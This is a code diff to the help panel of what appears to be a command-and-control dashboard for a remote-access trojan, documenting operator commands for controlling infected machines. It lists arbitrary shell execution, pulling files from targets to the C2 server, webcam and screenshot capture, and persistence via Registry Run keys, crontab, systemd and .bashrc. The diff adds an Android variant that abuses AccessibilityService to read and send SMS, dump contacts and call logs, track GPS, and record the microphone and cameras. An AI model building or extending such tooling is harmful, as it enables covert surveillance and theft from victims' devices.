@@ -128,20 +128,36 @@ if (!isAuthenticated()) {
 
                 <div style="color:var(--cyan);font-weight:600;margin:10px 0 6px">TERMINAL COMMANDS</div>
                 <table style="width:100%;border-collapse:collapse">
-                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">shell &lt;cmd&gt;</td><td>Run any Windows command (shell is optional, everything goes through cmd.exe).</td></tr>
-                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">ps</td><td>List running processes (tasklist /v).</td></tr>
-                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">kill &lt;pid&gt;</td><td>Kill a process by PID (taskkill /PID /F).</td></tr>
-                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">drives</td><td>List all disk partitions with type and size.</td></tr>
-                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">browse &lt;path&gt;</td><td>List directory contents. Use /C:/path format.</td></tr>
-                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">pull &lt;path&gt;</td><td>Upload file from target to C2 server. Use /C:/path format.</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">shell &lt;cmd&gt;</td><td>Run any command (shell, cmd.exe, or sh -c on Android).</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">ps</td><td>List running processes.</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">kill &lt;pid&gt;</td><td>Kill a process by PID.</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">drives</td><td>List all disk partitions/mount points with size.</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">browse &lt;path&gt;</td><td>List directory contents.</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">pull &lt;path&gt;</td><td>Upload file from target to C2 server.</td></tr>
                 <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">read &lt;path&gt;</td><td>Read file contents (text or base64 for binary, max 10MB).</td></tr>
                 <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">push &lt;file_id&gt; &lt;path&gt;</td><td>Download file from C2 to target.</td></tr>
                 <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">delete &lt;path&gt;</td><td>Delete file or directory.</td></tr>
                 <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">screenshot</td><td>Capture screen (same as &#128247; button).</td></tr>
                 <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">camera / cam</td><td>Capture webcam (same as &#128248; button).</td></tr>
-                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">persist</td><td>Install persistence (same as persist button).</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">ping</td><td>Basic check-in with timestamp.</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">hostname</td><td>Print target hostname.</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">persist</td><td>Install persistence (Registry Run/Startup/Task on Win; crontab/systemd/.bashrc on Linux; autostart on Android).</td></tr>
                 <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">die / killself</td><td>Kill beacon process instantly (no cleanup).</td></tr>
                 <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">selfdestruct</td><td>Full cleanup + kill (same as &#128128; button).</td></tr>
+                </table>
+
+                <div style="color:var(--cyan);font-weight:600;margin:10px 0 6px">ANDROID (Accessibility Variant Only)</div>
+                <table style="width:100%;border-collapse:collapse">
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">sms_read</td><td>Read SMS inbox (requires AccessibilityService).</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">sms_send &lt;number&gt; &lt;text&gt;</td><td>Send SMS (requires AccessibilityService).</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">contacts</td><td>Dump contact list (requires AccessibilityService).</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">calllog</td><td>Read call log (requires AccessibilityService).</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">clipboard</td><td>Read clipboard contents (requires AccessibilityService).</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">gps</td><td>Current GPS location (requires ACCESS_FINE_LOCATION).</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">camera_front</td><td>Front camera photo (requires CAMERA).</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">camera_back</td><td>Back camera photo (requires CAMERA).</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">mic &lt;seconds&gt;</td><td>Record audio (requires RECORD_AUDIO).</td></tr>
+                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">notifications</td><td>Read notification access (requires NotificationListenerService).</td></tr>
                 </table>
 
                 <div style="color:var(--cyan);font-weight:600;margin:10px 0 6px">FILE MANAGER</div>
